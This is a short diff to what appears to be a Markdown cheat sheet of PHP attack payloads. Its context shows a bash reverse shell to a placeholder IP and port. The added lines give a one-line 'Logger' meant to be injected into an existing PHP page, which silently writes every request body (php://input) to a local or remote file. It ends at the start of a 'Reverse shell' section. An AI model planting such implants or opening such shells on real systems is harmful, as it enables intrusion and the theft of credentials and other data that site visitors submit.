@@ -34,6 +34,14 @@ execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
 ?>
 ```
 
+### Logger
+
+Inject this string at the very top of an existing php file to log all requests parsed by the page. The path of output files is defined starting from the webroot.
+
+```php
+<?php file_put_contents('<local or remote file>', file_get_contents('php://input')); ?>
+```
+
 ## Reverse shell
 
 ```php
